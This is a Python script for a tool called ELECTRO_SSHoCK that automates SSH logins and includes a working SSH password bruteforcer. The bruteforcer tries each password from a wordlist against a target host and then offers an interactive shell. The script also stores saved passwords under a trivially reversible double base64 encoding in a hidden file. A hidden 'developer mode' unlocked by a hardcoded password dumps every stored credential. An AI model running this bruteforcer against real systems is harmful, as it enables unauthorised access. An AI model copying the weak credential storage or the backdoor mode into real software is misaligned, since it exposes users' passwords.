#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Apr 20 20:42:53 2020

@author: SAYAR
"""
import pexpect
import sys
import base64
import os
import getpass as P
from termcolor import colored
"""Imports the necessary libraries"""
def encoder (passw) :
    message = passw
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    message_bytes = base64_message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    return base64_message
def decoder(passw):


    base64_message = passw
    base64_bytes = base64_message.encode('ascii')   
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')
    base64_bytes = message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')
    return message    

def filer (ucode,host,port) :
    flag=0
    f=open('/etc/thunder_sshock/.pas_store.txt','r')
    for text in f.readlines() :
        text=text.split(' ')
        
        if text[0]==ucode :
            flag=1
            username=text[1]
            password=decoder(text[2])
            connector(host,username,password,port)
            return
        else :
            flag=0
    f.close()
    if flag ==0 :
            print(colored("[x]SEEMS LIKE YOU DONT HAVE YOUR CREDS REGISTERED!! TRY AGAIN WITH NEW LOGIN!",'red'))
            sys.exit(0)
    # else :
        
            

def adder(host,username,password,port="22") :
    code=''
    f=open('/etc/thunder_sshock/.pas_store.txt','r')
    for text in f.readlines ():
        text=text.split(' ')
        code=text[0]
        
    f.close()
    f=open('/etc/thunder_sshock/.pas_store.txt','a')
    if code !='':
        code=str(int(code)+1)
    else :
        code='0'
    #log='\n'+code+' '+username+' '+password
    try :
        retx=connector2(host,username,password,port)
    except :
        print(colored("[x]WRONG PASSWORD!! COULD NOT CONNECT TO SERVER!\n[x]CREDENTIALS NOT REGISTERED\n[x]EXITING NOW...",'red'))
        sys.exit(0)
    enc=encoder(password)
    log='\n'+code+' '+username+' '+enc
    f.write(log)
    print(colored("[v]SUCCESSFULLY REGISTERED!",'green'))
    print(colored('\n[*]THE UNIQUE CODE FOR USER '+username+ ' IS ' +code+' ','yellow'))
    print(colored('\n[v]NOW LOGGING IN...','green'))
    f.close()
def connector (host,username,passwd,port=22): 
    """ SSH Connection establisher"""
    string1="Are you sure you want to continue connecting "  # """where user input expected"""
    host=username+'@'+host
    PROMPT=['#','\$',host+':~$']
    string2=host+"'s [P|p]assword:"
    string3="Permission denied, please try again."
    connStr="ssh "+host+" -p "+port
    
    con=pexpect.spawn(connStr)
    ret=con.expect([pexpect.TIMEOUT,string1,string2])
    

    if ret==0 :
        print(colored("[x]FAILED TO CONNECT "+host,'red'))
        return
    if ret ==1 :
        con.sendline("yes")
        ret=con.expect([pexpect.TIMEOUT,string2])
        if ret==1 :
            
            con.sendline(passwd.strip("\n"))
            con.expect(PROMPT,timeout=0.5)
            print(colored("[v]LOGGED IN SUCCESSFULLY AS "+host,'green'))
            comline(con,host+':~$')
    if ret==2 :
        con.sendline(passwd.strip("\n"))
        s=con.expect(PROMPT,timeout=0.5)
        print(colored("[v]LOGGED IN SUCCESSFULLY AS "+host,'green'))
        con.expect(PROMPT,timeout=0.5)
        comline(con,host+':~$')
       
        
def connector2 (host,username,passwd,port="22"): 
    
    """ SSH Connection establisher"""
    string1="Are you sure you want to continue connecting "   #"""where user input expected"""
    host=username+'@'+host
    PROMPT=['#','\$',host+':~$']
    string2=host+"'s [P|p]assword:"
    connStr="ssh "+host+" -p "+port
    con=pexpect.spawn(connStr)
    
    ret=con.expect([pexpect.TIMEOUT,string1,string2])
    
    
  
    if ret==0 :
        print(colored("[x]FAILED TO CONNECT "+host,'red'))
        return
    if ret ==1 :
        con.sendline("yes")
        ret=con.expect([pexpect.TIMEOUT,string2])
        if ret==1:
            con.sendline(passwd.strip("\n"))
            ret1=con.expect(PROMPT,timeout=0.5)
            print(colored(ret1,'red'))
            if ret1==0 :
                return ret1
    if ret==2:
        
        con.sendline(passwd)
        retm=con.expect(PROMPT,timeout=0.5)
       
        if retm==0 :
            
            con.close()
            return retm
        
        

        
def brute(locationU,username,host,port="22"):
    """bruteforcer"""
    f=open(locationU,'r')
    for password in f.readlines() :
        password=password.strip('\n')
        try:
            ret=connector2(host,username,password,port)
            print(colored("[v]PASSWORD FOUND: "+password,'green'))
            opt=input("DO YOU WANT TO DROP INTO SHELL ? ")
            if(opt=="yes"):
                connector(host,username,password,port)
                return
            else :
                sys.exit(0)
        except:
            print (colored("[x]WRONG PASSWORD",'red'))
        
        
        

"""def comline (con,host):
    command excecutor
    PROMPT=['#','\$',host]
    command=''
    while command != "exit" :
        command=input(colored(host,'blue'))
        if command=='':
            command=input(colored(host,'blue'))  
        con.sendline(command)
        con.expect(PROMPT,timeout=0.5)
        print(con.before)
"""
def comline (con,host):
   # """command excecutor"""
    PROMPT=['#','\$',host]
    command=''
    while command != "exit" :
       # command=''
        #con.expect(PROMPT,timeout=0.5)
        stro=str(con.before)
        stro=stro.replace('\\n','\n').replace('\\r','\r').strip('b\'').strip(command)
        stro1=stro.split('\n')
        stro.strip(stro1[-1])
        print(stro)
        command=''
        command=input(colored(stro1[-1],'blue'))
        if command=='':
            command=input(colored(host,'blue'))  
        con.sendline(command)
        con.expect(PROMPT,timeout=1)
                
def remover (remhost):
    """SSH key remover"""
    remStr="ssh-keygen -f \"/root/.ssh/known_hosts\" -R \""+remhost+"\""
    blockstr="Original contents retained as /root/.ssh/known_hosts.old"
    blockstr2="Host 192.168.1.4 not found in /root/.ssh/known_hosts"
    rem=pexpect.spawn(remStr)
    rem.expect([pexpect.TIMEOUT,blockstr,blockstr2])
    print(rem.before)

def main () : 
    """Main Body"""
    print(colored(""" $$$$$$$$\ $$\       $$$$$$$$\  $$$$$$\ $$$$$$$$\ $$$$$$$\   $$$$$$\        $$$$$$\   $$$$$$\  $$\   $$\  $$$$$$\   $$$$$$\  $$\   $$\ 
$$  _____|$$ |      $$  _____|$$  __$$\\__$$  __|$$  __$$\ $$  __$$\      $$  __$$\ $$  __$$\ $$ |  $$ |$$  __$$\ $$  __$$\ $$ | $$  |
$$ |      $$ |      $$ |      $$ /  \__|  $$ |   $$ |  $$ |$$ /  $$ |     $$ /  \__|$$ /  \__|$$ |  $$ |$$ /  $$ |$$ /  \__|$$ |$$  / 
$$$$$\    $$ |      $$$$$\    $$ |        $$ |   $$$$$$$  |$$ |  $$ |     \$$$$$$\  \$$$$$$\  $$$$$$$$ |$$ |  $$ |$$ |      $$$$$  /  
$$  __|   $$ |      $$  __|   $$ |        $$ |   $$  __$$< $$ |  $$ |      \____$$\  \____$$\ $$  __$$ |$$ |  $$ |$$ |      $$  $$<   
$$ |      $$ |      $$ |      $$ |  $$\   $$ |   $$ |  $$ |$$ |  $$ |     $$\   $$ |$$\   $$ |$$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  
$$$$$$$$\ $$$$$$$$\ $$$$$$$$\ \$$$$$$  |  $$ |   $$ |  $$ | $$$$$$  |     \$$$$$$  |\$$$$$$  |$$ |  $$ | $$$$$$  |\$$$$$$  |$$ | \$$\ 
\________|\________|\________| \______/   \__|   \__|  \__| \______/$$$$$$\\______/  \______/ \__|  \__| \______/  \______/ \__|  \__|
                                                                    \______|                                                          
                                                              
""",'blue'))
    print("""╔═╗╦ ╦╔╦╗╦ ╦╔═╗╦═╗      ╔═╗╦ ╦╦ ╦╦  ╦╦═╗╔═╗╔═╗╔═╗╦ ╦╔═╗╦═╗
╠═╣║ ║ ║ ╠═╣║ ║╠╦╝      ╚═╗╠═╣║ ║╚╗╔╝╠╦╝║ ║╚═╗╠═╣╚╦╝╠═╣╠╦╝
╩ ╩╚═╝ ╩ ╩ ╩╚═╝╩╚═      ╚═╝╩ ╩╚═╝ ╚╝ ╩╚═╚═╝╚═╝╩ ╩ ╩ ╩ ╩╩╚═""")
    if not os.path.exists('/etc/thunder_sshock/.dev_ops.dat'):
        fd=open('/etc/thunder_sshock/.dev_ops.dat','x')
        fd.write('WkdWMlFXNWhjbU5vSXpFd01BPT0=')
        fd.close()
        
    print("""\n\nWELCOME TO ELECTRO_SSHoCK\n\nAn open source SSH bruteforcer and automator still in progress\n\n1.>AUTOMATE SSH LOGIN \n2.>REMOVE EXISTING FINGERPRINT\n3.>BRUTEFORCE SSH \n
          NOTE: Bruteforcer is currently capable of bruteforcing password only\n""")
    opt=input("ENTER OPTION : ")
    if(opt=='1'):
        opt2=input("1.>NEW LOGIN\n2.>EXISTING LOGIN\nENTER OPTION: ")
        if opt2=="1":
            host=input("ENTER HOST NAME/IP ADDRESS : ")
            port=input("ENTER SSH PORT <Default 22>: ")
            if port=='':
                port="22"
            user=input("ENTER USERNAME : ")
            passwd=P.getpass(prompt="ENTER PASSWORD : ")
            if os.path.exists('/etc/thunder_sshock/.pas_store.txt') :
                adder(host,user,passwd,port)
            else :
                opt=input("NO pas_store FILE FOUND! DO YOU WANT TO CREATE A NEW ONE ? : ")
                if opt=="yes" :
                    fo=open('/etc/thunder_sshock/.pas_store.txt','x')
                    fo.close()
                    adder(host,user,passwd,port)
                else :
                    print(colored('[x]NO STORAGE FILE CREATED. EXITTING NOW...','red'))
                    sys.exit(0)
            connector(host,user,passwd,port)
            
        elif opt2=="2":
            input1=input("ENTER YOUR UNIQUE LOGIN SERIAL : ")
            input2=input("ENTER HOST IP ADDRESS : ")
            input3=input("ENTER OPERATIONG PORT : ")
            filer(input1,input2,input3)
    elif opt=="2" :
        host=input("ENTER HOST IP TO REMOVE: ")
        remover(host)
    elif opt=="3" :
        host=input("ENTER HOST IP : ")
        port=input("ENTER PORT : ")
        if port=='':
            port="22"
        locationU=input("ENTER PASSWORD FILE LOCATION : " )
        user=input("ENTER USERNAME : ")
        brute(locationU,user,host)
    elif opt=="100" :
        print(colored("[#][#][#]WELCOME TO SECRET_DEVELOPER MODE.\n"))
        passwd=encoder(P.getpass(prompt=colored("[x][x][x]ENTER PASSWORD : ",'red')))
        fd=open('/etc/thunder_sshock/.dev_ops.dat','r')
        if passwd==fd.readline() :
            fd.close()
            optd= input(colored("[v][v][v]ACCESS GRANTED. YOU CAN VIEW THE PASS_STORE FILE NOW.\nTYPE YES TO CONTINUE : ",'green'))
            if optd=="yes" :
               fd=open('/etc/thunder_sshock/.pas_store.txt','r')
               for text in fd.readlines() :
                   print(colored(text,'blue'))
               fd.close()
               sys.exit(0)
        else :
                print(colored("[X}WRONG PASSWORD!! YOU ARE NO_DEV!! EXITTING NOW...",'red'))
                sys.exit(0)
        
        
        
        
        
main()

